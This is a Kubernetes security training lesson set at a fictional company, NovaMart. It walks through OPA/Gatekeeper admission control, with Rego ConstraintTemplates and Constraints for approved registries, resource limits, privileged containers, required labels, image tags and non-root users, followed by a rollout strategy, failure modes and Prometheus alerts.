# Phase 6, Lesson 3: Kubernetes Security — OPA/Gatekeeper, Pod Security, Falco, Supply Chain Security

---

## Why This Lesson Matters at NovaMart

```text
NovaMart runs 200+ microservices on EKS. That's 200+ teams making
deployment decisions. Without guardrails:

  - A developer deploys a container running as root → attacker escapes to node
  - A team pulls an unscanned image from Docker Hub → cryptominer in production
  - A pod mounts the Docker socket → full cluster compromise
  - A container runs in privileged mode → kernel-level access
  - A malicious dependency in a base image → supply chain attack

Kubernetes is SECURE BY DEFAULT... if you never deploy anything.
The moment workloads arrive, security becomes a policy enforcement problem.

This lesson covers the four layers of Kubernetes security:
  1. ADMISSION CONTROL — What's allowed to enter the cluster (OPA/Gatekeeper)
  2. POD SECURITY — What pods are allowed to do (PSA/PSS)
  3. RUNTIME SECURITY — What's happening right now inside containers (Falco)
  4. SUPPLY CHAIN — What's in your images and can you trust them (Signing, SBOM, Scanning)
```

```text
┌─────────────────────────────────────────────────────────────────────┐
│                     KUBERNETES SECURITY LAYERS                      │
│                                                                     │
│ ┌──────────────────────────────────────────────┐                    │
│ │ LAYER 1: ADMISSION CONTROL                   │  "Can this         │
│ │ OPA/Gatekeeper, Kyverno                      │   deploy?"         │
│ │ → Policy-as-code gate at API server          │                    │
│ └──────────────────────┬───────────────────────┘                    │
│                        │ ALLOWED                                    │
│                        ▼                                            │
│ ┌──────────────────────────────────────────────┐                    │
│ │ LAYER 2: POD SECURITY                        │  "What can         │
│ │ Pod Security Standards (PSA/PSS)             │   this pod do?"    │
│ │ → Kernel-level restrictions on pod behavior  │                    │
│ └──────────────────────┬───────────────────────┘                    │
│                        │ RUNNING                                    │
│                        ▼                                            │
│ ┌──────────────────────────────────────────────┐                    │
│ │ LAYER 3: RUNTIME SECURITY                    │  "What IS this     │
│ │ Falco, eBPF-based tools                      │   pod doing?"      │
│ │ → Real-time syscall monitoring + alerting    │                    │
│ └──────────────────────┬───────────────────────┘                    │
│                        │                                            │
│                        ▼                                            │
│ ┌──────────────────────────────────────────────┐                    │
│ │ LAYER 4: SUPPLY CHAIN                        │  "Can I trust      │
│ │ Image scanning, signing, SBOM, provenance    │   this image?"     │
│ │ → Verify before Layer 1 even evaluates       │                    │
│ └──────────────────────────────────────────────┘                    │
│                                                                     │
│ Defense in depth: Each layer catches what the previous missed.      │
│ Layer 1 blocks bad configs. Layer 2 enforces kernel restrictions.   │
│ Layer 3 detects runtime anomalies. Layer 4 validates the source.    │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Part 1: Admission Control — OPA/Gatekeeper

### What Is Admission Control?

```text
Every API request to Kubernetes passes through an ADMISSION CHAIN:

  kubectl apply -f deployment.yaml
       │
       ▼
  ┌──────────────────┐
  │ AUTHENTICATION   │  "WHO are you?" (x509, OIDC, ServiceAccount token)
  └────────┬─────────┘
           ▼
  ┌──────────────────┐
  │ AUTHORIZATION    │  "CAN you do this?" (RBAC: Role/ClusterRoleBinding)
  └────────┬─────────┘
           ▼
  ┌──────────────────────────────────────────────────────────────┐
  │ MUTATING ADMISSION WEBHOOKS                                  │
  │ → Modify the request (inject sidecars, add labels, set       │
  │   defaults). Runs FIRST because validators validate the      │
  │   MUTATED result.                                            │
  │                                                              │
  │ Examples:                                                    │
  │   Istio sidecar injector: adds Envoy container               │
  │   Vault Agent injector: adds vault-agent-init + sidecar      │
  │   OPA Gatekeeper: can mutate (add labels, set defaults)      │
  │   Kyverno: generate resources, set defaults                  │
  └────────┬─────────────────────────────────────────────────────┘
           ▼
  ┌──────────────────────────────────────────────────────────────┐
  │ VALIDATING ADMISSION WEBHOOKS                                │
  │ → Accept or reject the request. Cannot modify it.            │
  │ → THIS is where policy enforcement happens.                  │
  │                                                              │
  │ Examples:                                                    │
  │   OPA Gatekeeper: reject pods without resource limits        │
  │   Kyverno: reject images not from approved registries        │
  │   Pod Security Admission: enforce PSS levels                 │
  └────────┬─────────────────────────────────────────────────────┘
           ▼
  ┌──────────────────┐
  │ PERSIST TO ETCD  │  Object created/updated
  └──────────────────┘

KEY INSIGHT: Admission webhooks are the ONLY point where you can
enforce policy BEFORE a workload enters the cluster. Once it's in
etcd, you need runtime detection (Falco) to catch violations.
```

### OPA — Open Policy Agent

```text
OPA is a GENERAL-PURPOSE policy engine. It's not Kubernetes-specific.

  OPA = Decision engine
  Input: JSON (any structured data)
  Policy: Rego (OPA's policy language)
  Output: JSON (allow/deny + reason)

OPA can enforce policy on:
  - Kubernetes admissions (via Gatekeeper)
  - Terraform plans (via conftest)
  - CI/CD pipelines (via conftest)
  - API authorization (via OPA sidecar)
  - Microservice authorization (via Envoy external authorization)

NovaMart uses OPA in TWO places:
  1. Gatekeeper — admission control in EKS
  2. Conftest — Terraform plan validation in CI (Phase 4 connection)
```

### Gatekeeper — OPA for Kubernetes

```text
Gatekeeper is the Kubernetes-native integration of OPA.

  Instead of writing raw Rego and managing OPA sidecars,
  Gatekeeper provides:
    - CRDs for policy management (ConstraintTemplates, Constraints)
    - Audit functionality (find existing violations)
    - Mutation support (modify resources, not just accept/reject)
    - Metrics and observability
    - Dry-run mode (log violations without blocking)

ARCHITECTURE:

  ┌──────────────────────────────────────────────────────────┐
  │                       EKS CLUSTER                        │
  │                                                          │
  │ ┌────────────┐     ┌───────────────────────────────────┐ │
  │ │ API Server │────→│ Gatekeeper Webhook                │ │
  │ │            │     │ (ValidatingAdmissionWebhook)      │ │
  │ │            │     │                                   │ │
  │ │            │     │ ┌───────────────────────────────┐ │ │
  │ │            │     │ │ OPA Engine                    │ │ │
  │ │            │     │ │                               │ │ │
  │ │            │     │ │ ConstraintTemplates           │ │ │
  │ │            │     │ │ (Rego policies)               │ │ │
  │ │            │     │ │         +                     │ │ │
  │ │            │     │ │ Constraints                   │ │ │
  │ │            │     │ │ (policy parameters +          │ │ │
  │ │            │     │ │  scope/match rules)           │ │ │
  │ │            │     │ └───────────────────────────────┘ │ │
  │ │            │     │                                   │ │
  │ │            │     │ Audit Controller                  │ │
  │ │            │     │ (periodically scans existing      │ │
  │ │            │     │  resources for violations)        │ │
  │ └────────────┘     └───────────────────────────────────┘ │
  │                                                          │
  │ ConstraintTemplate → defines the POLICY (Rego code)      │
  │ Constraint → defines WHERE and HOW the policy applies    │
  │                                                          │
  │ Think of it like:                                        │
  │   ConstraintTemplate = the function definition           │
  │   Constraint = the function call with arguments          │
  └──────────────────────────────────────────────────────────┘
```

### Gatekeeper Installation

```yaml
# Install Gatekeeper via Helm
helm repo add gatekeeper https://open-policy-agent.github.io/gatekeeper/charts
helm repo update

helm install gatekeeper gatekeeper/gatekeeper \
  --namespace gatekeeper-system \
  --create-namespace \
  --set replicas=3 \
  --set podAnnotations."cluster-autoscaler\.kubernetes\.io/safe-to-evict"="true" \
  --set audit.replicas=1 \
  --set audit.logLevel=INFO \
  --set audit.constraintViolationsLimit=100 \
  --set psp.enabled=false \
  --set mutatingWebhookEnabled=true \
  --set logDenies=true \
  --set emitAdmissionEvents=true \
  --set emitAuditEvents=true \
  --set audit.writeToRAMDisk=true \
  --set controllerManager.resources.requests.cpu=100m \
  --set controllerManager.resources.requests.memory=512Mi \
  --set controllerManager.resources.limits.memory=1Gi \
  --set audit.resources.requests.cpu=100m \
  --set audit.resources.requests.memory=512Mi \
  --set audit.resources.limits.memory=1Gi

# CRITICAL FLAGS:
# replicas=3           → HA for the webhook (webhook down = nothing deploys)
# logDenies=true       → Violations appear in Gatekeeper logs → Loki
# emitAdmissionEvents  → K8s Events for denied admissions
# emitAuditEvents      → K8s Events for audit violations
# mutatingWebhookEnabled → Enable mutation (defaults, labels)
```

### Gatekeeper Policy Model: ConstraintTemplate + Constraint

```text
THE TWO-LAYER MODEL:

  ConstraintTemplate:
    - Defines the LOGIC (Rego code)
    - Declares parameters the Constraint can pass in
    - Creates a NEW CRD (the Constraint kind)
    - Written by: Platform/Security team
    - Changed: Rarely (policy logic changes)

  Constraint:
    - INSTANCE of a ConstraintTemplate
    - Specifies: which resources to check, parameter values
    - Uses the CRD created by the ConstraintTemplate
    - Written by: Platform team (or per-team in their namespace)
    - Changed: More often (adding namespaces, adjusting thresholds)

ANALOGY:
  ConstraintTemplate = "Images must come from approved registries"
                       (with Rego code to check registry prefixes)
  Constraint         = "Apply this to all Pods in production namespaces.
                        Approved registries are: 888888888888.dkr.ecr.us-east-1,
                        docker.io/library (official only), gcr.io/distroless"
```

### NovaMart's Gatekeeper Policies — Full Production Set

Let me walk through every policy NovaMart enforces, with the full Rego and Constraint YAML.

#### Policy 1: Require Approved Container Registries

```yaml
# ConstraintTemplate — defines the policy logic
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sallowedregistries
  annotations:
    description: "Requires container images to come from approved registries"
spec:
  crd:
    spec:
      names:
        kind: K8sAllowedRegistries
      validation:
        openAPIV3Schema:
          type: object
          properties:
            registries:
              type: array
              items:
                type: string
              description: "List of allowed registry prefixes"
            exemptImages:
              type: array
              items:
                type: string
              description: "Specific images exempt from the registry check"
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sallowedregistries

        # Violation if ANY container image doesn't match approved registries
        violation[{"msg": msg}] {
          container := input_containers[_]
          not image_allowed(container.image)
          msg := sprintf(
            "Container '%v' image '%v' is not from an approved registry. Approved: %v",[container.name, container.image, input.parameters.registries]
          )
        }

        # Check if image matches any approved registry prefix
        image_allowed(image) {
          registry := input.parameters.registries[_]
          startswith(image, registry)
        }

        # Check if image is in the exempt list
        image_allowed(image) {
          exempt := input.parameters.exemptImages[_]
          image == exempt
        }

        # Collect ALL containers (init, regular, ephemeral)
        input_containers[c] {
          c := input.review.object.spec.containers[_]
        }
        input_containers[c] {
          c := input.review.object.spec.initContainers[_]
        }
        input_containers[c] {
          c := input.review.object.spec.ephemeralContainers[_]
        }

---
# Constraint — applies the policy with specific parameters
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRegistries
metadata:
  name: allowed-registries-production
spec:
  enforcementAction: deny  # deny | dryrun | warn
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
      - apiGroups: ["apps"]
        kinds:["Deployment", "StatefulSet", "DaemonSet"]
      - apiGroups: ["batch"]
        kinds: ["Job", "CronJob"]
    namespaceSelector:
      matchExpressions:
        - key: environment
          operator: In
          values:["production", "staging"]
    excludedNamespaces:
      - kube-system
      - gatekeeper-system
      - monitoring
      - vault
  parameters:
    registries:
      - "888888888888.dkr.ecr.us-east-1.amazonaws.com/"
      - "888888888888.dkr.ecr.us-west-2.amazonaws.com/"
      - "888888888888.dkr.ecr.eu-west-1.amazonaws.com/"
      - "gcr.io/distroless/"
      - "docker.io/library/"           # Official images only
      - "quay.io/prometheus/"
      - "registry.k8s.io/"             # Official K8s images
    exemptImages:
      - "docker.io/istio/proxyv2:1.20.0"  # Pinned Istio version
```

```text
REGO EXPLAINED (for those who haven't written it):

  violation[{"msg": msg}] { ... }
    → This is a RULE. If the body evaluates to true, there's a violation.
    → Multiple violation rules: ANY one matching = violation
    → "msg" is the denial message returned to the user

  input.review.object
    → The actual K8s resource being admitted
    → For a Deployment: input.review.object.spec.template.spec.containers

  input.parameters
    → Values from the Constraint's spec.parameters

  container := input_containers[_]
    → Iteration. The underscore means "for each element"
    → input_containers is a helper rule that collects all container types

  startswith(image, registry)
    → Built-in string function

  The "not image_allowed" pattern:
    → Rego uses negation carefully. "not X" means X cannot be proven true.
    → This checks: does this image match ANY registry? If no match → violation.
```

#### Policy 2: Require Resource Limits

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredresources
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredResources
      validation:
        openAPIV3Schema:
          type: object
          properties:
            requireLimits:
              type: boolean
            requireRequests:
              type: boolean
            maxCpuLimit:
              type: string
            maxMemoryLimit:
              type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiredresources

        # Missing resource requests
        violation[{"msg": msg}] {
          input.parameters.requireRequests
          container := input_containers[_]
          not container.resources.requests.cpu
          msg := sprintf(
            "Container '%v' must have CPU requests set",
            [container.name]
          )
        }

        violation[{"msg": msg}] {
          input.parameters.requireRequests
          container := input_containers[_]
          not container.resources.requests.memory
          msg := sprintf(
            "Container '%v' must have memory requests set",
            [container.name]
          )
        }

        # Missing resource limits (memory MUST have limits, CPU is debatable)
        violation[{"msg": msg}] {
          input.parameters.requireLimits
          container := input_containers[_]
          not container.resources.limits.memory
          msg := sprintf(
            "Container '%v' must have memory limits set",[container.name]
          )
        }

        # Memory limit exceeds maximum
        violation[{"msg": msg}] {
          input.parameters.maxMemoryLimit
          container := input_containers[_]
          mem_limit := container.resources.limits.memory
          mem_limit_bytes := to_bytes(mem_limit)
          max_bytes := to_bytes(input.parameters.maxMemoryLimit)
          mem_limit_bytes > max_bytes
          msg := sprintf(
            "Container '%v' memory limit %v exceeds maximum %v",[container.name, mem_limit, input.parameters.maxMemoryLimit]
          )
        }

        # Helper: convert K8s resource strings to bytes
        to_bytes(s) = result {
          endswith(s, "Gi")
          num := to_number(trim_suffix(s, "Gi"))
          result := num * 1073741824
        }
        to_bytes(s) = result {
          endswith(s, "Mi")
          num := to_number(trim_suffix(s, "Mi"))
          result := num * 1048576
        }
        to_bytes(s) = result {
          endswith(s, "Ki")
          num := to_number(trim_suffix(s, "Ki"))
          result := num * 1024
        }

        input_containers[c] { c := input.review.object.spec.containers[_] }
        input_containers[c] { c := input.review.object.spec.initContainers[_] }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredResources
metadata:
  name: require-resource-limits-production
spec:
  enforcementAction: deny
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    namespaceSelector:
      matchExpressions:
        - key: environment
          operator: In
          values: ["production"]
    excludedNamespaces:
      - kube-system
      - gatekeeper-system
  parameters:
    requireRequests: true
    requireLimits: true      # Memory limits required
    maxMemoryLimit: "8Gi"    # No single container > 8Gi
    maxCpuLimit: ""          # CPU limits: NovaMart's stance is NO CPU limits
                             # (use requests only — avoid CFS throttling)
```

```text
NOTE ON CPU LIMITS:
NovaMart does NOT enforce CPU limits. Why?

CPU limits use CFS (Completely Fair Scheduler) with 100ms windows.
A container with 1 CPU limit that bursts to 1.5 CPUs for 30ms gets THROTTLED
even though the node has spare capacity.

NovaMart's strategy:
  ✅ CPU REQUESTS: Required (scheduler needs them for bin-packing)
  ❌ CPU LIMITS: Not required (avoid CFS throttling on bursty workloads)
  ✅ MEMORY LIMITS: Required (OOM is the alternative, and that's worse)
  
  This is the "Guaranteed memory, Burstable CPU" pattern.
  If CPU becomes contentious, requests ensure fair sharing.
  
  Exception: Multi-tenant clusters where noisy-neighbor isolation is
  critical → enforce CPU limits. NovaMart's clusters are team-dedicated.
```

#### Policy 3: Block Privileged Containers

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sblockprivileged
spec:
  crd:
    spec:
      names:
        kind: K8sBlockPrivileged
      validation:
        openAPIV3Schema:
          type: object
          properties:
            allowedExceptions:
              type: array
              items:
                type: string
              description: "Container names allowed to run privileged"
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sblockprivileged

        violation[{"msg": msg}] {
          container := input_containers[_]
          container.securityContext.privileged == true
          not is_excepted(container.name)
          msg := sprintf(
            "Privileged containers are forbidden. Container '%v' has privileged: true",
            [container.name]
          )
        }

        # Block privilege escalation
        violation[{"msg": msg}] {
          container := input_containers[_]
          container.securityContext.allowPrivilegeEscalation == true
          not is_excepted(container.name)
          msg := sprintf(
            "Privilege escalation forbidden. Container '%v' has allowPrivilegeEscalation: true",
            [container.name]
          )
        }

        # Block hostPID
        violation[{"msg": msg}] {
          input.review.object.spec.hostPID == true
          msg := "hostPID is forbidden"
        }

        # Block hostNetwork
        violation[{"msg": msg}] {
          input.review.object.spec.hostNetwork == true
          msg := "hostNetwork is forbidden"
        }

        # Block hostPath volumes
        violation[{"msg": msg}] {
          volume := input.review.object.spec.volumes[_]
          volume.hostPath
          msg := sprintf(
            "hostPath volumes are forbidden. Volume '%v' uses hostPath '%v'",
            [volume.name, volume.hostPath.path]
          )
        }

        is_excepted(name) {
          exception := input.parameters.allowedExceptions[_]
          name == exception
        }

        input_containers[c] { c := input.review.object.spec.containers[_] }
        input_containers[c] { c := input.review.object.spec.initContainers[_] }
        input_containers[c] { c := input.review.object.spec.ephemeralContainers[_] }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sBlockPrivileged
metadata:
  name: block-privileged-production
spec:
  enforcementAction: deny
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    excludedNamespaces:
      - kube-system        # CNI, kube-proxy may need privileges
      - monitoring         # node-exporter needs hostPID/hostNetwork
  parameters:
    allowedExceptions:
      - "istio-init"       # Istio init container needs NET_ADMIN briefly
```

#### Policy 4: Require Labels (Operational Metadata)

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredlabels
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredLabels
      validation:
        openAPIV3Schema:
          type: object
          properties:
            labels:
              type: array
              items:
                type: object
                properties:
                  key:
                    type: string
                  allowedRegex:
                    type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiredlabels

        violation[{"msg": msg}] {
          required := input.parameters.labels[_]
          not has_label(required.key)
          msg := sprintf("Missing required label: '%v'", [required.key])
        }

        violation[{"msg": msg}] {
          required := input.parameters.labels[_]
          required.allowedRegex != ""
          label_value := input.review.object.metadata.labels[required.key]
          not re_match(required.allowedRegex, label_value)
          msg := sprintf(
            "Label '%v' value '%v' does not match regex '%v'",[required.key, label_value, required.allowedRegex]
          )
        }

        has_label(key) {
          input.review.object.metadata.labels[key]
        }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: require-operational-labels
spec:
  enforcementAction: deny
  match:
    kinds:
      - apiGroups: ["apps"]
        kinds: ["Deployment", "StatefulSet"]
    namespaceSelector:
      matchExpressions:
        - key: environment
          operator: In
          values:["production", "staging"]
  parameters:
    labels:
      - key: "app.kubernetes.io/name"
        allowedRegex: "^[a-z0-9-]+$"
      - key: "app.kubernetes.io/version"
        allowedRegex: ""
      - key: "app.novamart.com/team"
        allowedRegex: "^(platform|payments|orders|search|notifications|data|security)$"
      - key: "app.novamart.com/tier"
        allowedRegex: "^(frontend|backend|data|infra)$"
```

#### Policy 5: Block Latest Tag

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sdisallowedtags
spec:
  crd:
    spec:
      names:
        kind: K8sDisallowedTags
      validation:
        openAPIV3Schema:
          type: object
          properties:
            tags:
              type: array
              items:
                type: string
            requireDigest:
              type: boolean
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sdisallowedtags

        violation[{"msg": msg}] {
          container := input_containers[_]
          tag := get_tag(container.image)
          disallowed := input.parameters.tags[_]
          tag == disallowed
          msg := sprintf(
            "Container '%v' uses disallowed tag '%v'. Use a specific immutable tag.",[container.name, tag]
          )
        }

        # No tag at all defaults to :latest
        violation[{"msg": msg}] {
          container := input_containers[_]
          not contains(container.image, ":")
          not contains(container.image, "@")  # Digest reference has no tag
          msg := sprintf(
            "Container '%v' image '%v' has no tag (defaults to :latest). Use a specific tag.",
            [container.name, container.image]
          )
        }

        # Optionally require digest pinning
        violation[{"msg": msg}] {
          input.parameters.requireDigest
          container := input_containers[_]
          not contains(container.image, "@sha256:")
          msg := sprintf(
            "Container '%v' image '%v' must use digest pinning (@sha256:...)",
            [container.name, container.image]
          )
        }

        get_tag(image) = tag {
          parts := split(image, ":")
          count(parts) == 2
          tag_with_digest := parts[1]
          tag := split(tag_with_digest, "@")[0]
        }

        input_containers[c] { c := input.review.object.spec.containers[_] }
        input_containers[c] { c := input.review.object.spec.initContainers[_] }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sDisallowedTags
metadata:
  name: block-latest-tag
spec:
  enforcementAction: deny
  match:
    kinds:
      - apiGroups: [""]
        kinds:["Pod"]
    namespaceSelector:
      matchExpressions:
        - key: environment
          operator: In
          values: ["production", "staging"]
  parameters:
    tags:
      - "latest"
      - "dev"
      - "test"
      - "nightly"
    requireDigest: false  # true for PCI namespaces only
```

#### Policy 6: Require Non-Root User

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srunasnonroot
spec:
  crd:
    spec:
      names:
        kind: K8sRunAsNonRoot
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srunasnonroot

        # Pod-level runAsNonRoot should be true
        violation[{"msg": msg}] {
          not pod_nonroot
          container := input_containers[_]
          not container_nonroot(container)
          msg := sprintf(
            "Container '%v' must not run as root. Set runAsNonRoot: true",
            [container.name]
          )
        }

        # Explicit runAsUser: 0 is forbidden
        violation[{"msg": msg}] {
          container := input_containers[_]
          container.securityContext.runAsUser == 0
          msg := sprintf(
            "Container '%v' explicitly sets runAsUser: 0 (root). Forbidden.",
            [container.name]
          )
        }

        pod_nonroot {
          input.review.object.spec.securityContext.runAsNonRoot == true
        }

        container_nonroot(container) {
          container.securityContext.runAsNonRoot == true
        }

        input_containers[c] { c := input.review.object.spec.containers[_] }
        input_containers[c] { c := input.review.object.spec.initContainers[_] }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRunAsNonRoot
metadata:
  name: require-nonroot-production
spec:
  enforcementAction: deny
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    excludedNamespaces:
      - kube-system
      - monitoring  # Some exporters need root
```

### Gatekeeper Enforcement Strategy — The Rollout

```text
NEVER go straight to "deny" in production. Here's the correct rollout:

PHASE 1: AUDIT ONLY (Week 1-2)
┌─────────────────────────────────────────────────────────────┐
│ enforcementAction: dryrun                                   │
│                                                             │
│ What happens:                                               │
│   - Gatekeeper evaluates all resources against policies     │
│   - Violations are LOGGED and stored on the Constraint      │
│   - Nothing is blocked                                      │
│   - Audit controller finds existing violations              │
│                                                             │
│ Why:                                                        │
│   - See how many existing resources violate the policy      │
│   - Identify legitimate exceptions that need allowlisting   │
│   - Build developer confidence that policies won't break    │
│     their workflows                                         │
└─────────────────────────────────────────────────────────────┘

# Check violations:
kubectl get K8sAllowedRegistries allowed-registries-production \
  -o jsonpath='{.status.violations}' | jq .

# Count total violations:
kubectl get K8sAllowedRegistries allowed-registries-production \
  -o jsonpath='{.status.totalViolations}'

PHASE 2: WARN (Week 3-4)
┌─────────────────────────────────────────────────────────────┐
│ enforcementAction: warn                                     │
│                                                             │
│ What happens:                                               │
│   - API request SUCCEEDS but kubectl shows a WARNING        │
│   - Developers see the message but aren't blocked           │
│   - Dashboard shows violation metrics rising or falling     │
│                                                             │
│ Why:                                                        │
│   - Developers fix violations before enforcement            │
│   - Builds awareness without disruption                     │
└─────────────────────────────────────────────────────────────┘

PHASE 3: DENY (Week 5+)
┌─────────────────────────────────────────────────────────────┐
│ enforcementAction: deny                                     │
│                                                             │
│ What happens:                                               │
│   - API request REJECTED with error message                 │
│   - Resource is NOT created/updated                         │
│   - Error includes the violation message from Rego          │
│                                                             │
│ Why:                                                        │
│   - Hard enforcement — no exceptions unless explicitly      │
│     configured in the Constraint                            │
└─────────────────────────────────────────────────────────────┘

IMPORTANT: Keep some policies PERMANENTLY in warn or dryrun
for new/experimental namespaces. Not everything needs deny.
```

### Gatekeeper vs Kyverno — The Comparison

```text
┌───────────────────┬──────────────────────┬──────────────────────┐
│ Feature           │ Gatekeeper (OPA)     │ Kyverno              │
├───────────────────┼──────────────────────┼──────────────────────┤
│ Policy language   │ Rego (dedicated)     │ YAML (K8s-native)    │
│ Learning curve    │ HIGH (Rego is hard)  │ LOW (just YAML)      │
│ Flexibility       │ Extremely flexible   │ Covers 90% of cases  │
│ Mutation          │ Yes (newer feature)  │ Yes (first-class)    │
│ Generation        │ No                   │ Yes (create resources│
│                   │                      │  when pod created)   │
│ Validation        │ Yes                  │ Yes                  │
│ Image verification│ External (Cosign)    │ Built-in (Cosign,    │
│                   │                      │  Notary, Sigstore)   │
│ Audit             │ Built-in             │ Built-in             │
│ CLI testing       │ conftest             │ kyverno test         │
│ Community         │ CNCF Graduated       │ CNCF Incubating      │
│ Multi-platform    │ Yes (OPA is general) │ No (K8s only)        │
│ Performance       │ Fast (compiled Rego) │ Fast                 │
│ CRD model         │ Template + Constraint│ ClusterPolicy        │
│ Maturity          │ Older, battle-tested │ Newer, rapidly growing│
├───────────────────┼──────────────────────┼──────────────────────┤
│ NovaMart choice   │ ✅ Primary           │ Cosign verification  │
│                   │ (OPA also used for   │ only (Kyverno excels │
│                   │  Terraform/CI)       │  at image signing)   │
└───────────────────┴──────────────────────┴──────────────────────┘

WHY NOVAMART USES GATEKEEPER (not just Kyverno):
1. OPA is ALSO used for Terraform plan validation (conftest)
   → One policy language across K8s AND infrastructure-as-code
2. Gatekeeper is CNCF Graduated (Kyverno is Incubating)
3. Rego's flexibility handles complex policies that YAML can't express
4. Team already knows Rego from Terraform conftest integration

WHY NOVAMART ALSO USES KYVERNO (for one thing):
  Kyverno's image verification policy is superior to Gatekeeper's:
  - Built-in Cosign/Sigstore integration
  - Verify image signatures as part of admission
  - No external webhook needed
  We'll cover this in the Supply Chain section (Part 4)
```

### Gatekeeper Failure Modes

```text
FAILURE 1: Gatekeeper webhook down → ALL deployments blocked
  CAUSE: Gatekeeper pods crashloop, OOM, or scheduling failure
  SYMPTOM: kubectl apply returns "connection refused" or "timeout"
           for ANY resource creation
  THIS IS THE #1 GATEKEEPER RISK. Gatekeeper is in the critical path.
  
  FIX (PREVENTION):
    # failurePolicy controls what happens when the webhook is unreachable
    # Default is "Fail" (closed) → nothing deploys if Gatekeeper is down
    # Option: "Ignore" (open) → everything deploys if Gatekeeper is down
    
    # NovaMart's approach: Fail (closed) with operational safeguards
    # - 3 replicas with pod anti-affinity (survive AZ failure)
    # - PDB: minAvailable: 2
    # - Resource requests/limits to prevent OOM
    # - High-priority PriorityClass (don't get evicted)
    
    # EMERGENCY: If Gatekeeper is hard-down and blocking critical deploys:
    kubectl delete validatingwebhookconfiguration \
      gatekeeper-validating-webhook-configuration
    # ⚠️ This disables ALL Gatekeeper policies immediately
    # Re-create when Gatekeeper recovers:
    # The Gatekeeper controller will recreate it automatically on restart
    
  DEBATE: failurePolicy: Fail vs Ignore
    Fail (closed): More secure, blocks deploys if Gatekeeper is down
    Ignore (open): More available, allows unchecked deploys
    
    NovaMart: Fail, because:
    - 3 replicas makes downtime extremely unlikely
    - We'd rather block deploys than allow unchecked containers
    - An attacker could intentionally kill Gatekeeper to bypass policies
      if we used "Ignore" (security bypass via availability attack)

FAILURE 2: Rego policy bug blocks legitimate workloads
  CAUSE: Typo in Rego, edge case not handled, regex too strict
  SYMPTOM: Teams can't deploy even though their resources are compliant
  PREVENTION:
    - ALWAYS test Rego policies with conftest before applying:
      conftest test test-fixtures/ -p policies/ --all-namespaces
    - Use dryrun/warn before deny
    - Include test fixtures in CI (good pods that SHOULD pass,
      bad pods that SHOULD fail)
    - CI pipeline for policy changes (PR → test → dryrun → approve → deny)

FAILURE 3: Audit backlog — violations never surfaced
  CAUSE: Too many resources, audit interval too long
  SYMPTOM: .status.violations shows stale data
  FIX: Tune audit interval:
    --audit-interval=300  (default 60s, too aggressive for large clusters)
    --audit-from-cache=true  (audit from OPA cache, not API server)
    --constraint-violations-limit=100  (per constraint, prevent memory bloat)

FAILURE 4: Gatekeeper bypassed by system controllers
  CAUSE: Webhooks have excludedNamespaces for kube-system.
         An attacker creates a pod in kube-system.
  MITIGATION:
    - RBAC: Only platform team can create in kube-system
    - Audit: Alert on any non-standard pods in kube-system
    - Never exclude namespaces broadly — exclude specific resources
      where possible

FAILURE 5: Constraint applied but not synced with OPA
  CAUSE: ConstraintTemplate not installed before Constraint,
         or Rego compilation error
  SYMPTOM: Constraint exists but has no violations and no denials
  DEBUG:
    kubectl get constrainttemplate k8sallowedregistries -o yaml
    # Check status.created and status.byPod for compilation errors
    kubectl describe constraint allowed-registries-production
    # Check events for "template not found" errors

FAILURE 6: Policy drift — policy in Git differs from cluster
  CAUSE: Manual kubectl apply without going through GitOps
  FIX: Manage all ConstraintTemplates and Constraints through ArgoCD
       ArgoCD detects drift and auto-syncs (or alerts)
```

### Gatekeeper Monitoring

```yaml
# Gatekeeper exposes Prometheus metrics:
# gatekeeper_violations — count of audit violations per constraint
# gatekeeper_request_count — webhook requests (allow/deny)
# gatekeeper_request_duration_seconds — webhook latency

# PrometheusRule for Gatekeeper health
apiVersion: monitoring.coreos.com/v1
kind: PrometheusRule
metadata:
  name: gatekeeper-alerts
  namespace: monitoring
spec:
  groups:
    - name: gatekeeper.rules
      rules:
        # Gatekeeper webhook latency
        - alert: GatekeeperWebhookLatencyHigh
          expr: |
            histogram_quantile(0.99,
              rate(gatekeeper_request_duration_seconds_bucket[5m])
            ) > 1
          for: 5m
          labels:
            severity: warning
          annotations:
            summary: "Gatekeeper webhook p99 latency > 1s"
            description: "High webhook latency adds to every kubectl apply"
            
        # Gatekeeper denials spike
        - alert: GatekeeperDenialSpike
          expr: |
            sum(rate(gatekeeper_request_count{admission_status="deny"}[15m])) > 10
          for: 5m
          labels:
            severity: warning
          annotations:
            summary: "High rate of Gatekeeper denials"
            description: "May indicate a broken CI pipeline or developer confusion"

        # Gatekeeper audit violations increasing
        - alert: GatekeeperAuditViolationsIncreasing
          expr: |
            sum(gatekeeper_violations) > 50
          for: 30m
          labels:
            severity: warning
          annotations:
            summary: "{{ $value }} Gatekeeper audit violations detected"
            description: "Existing resources violating policies"

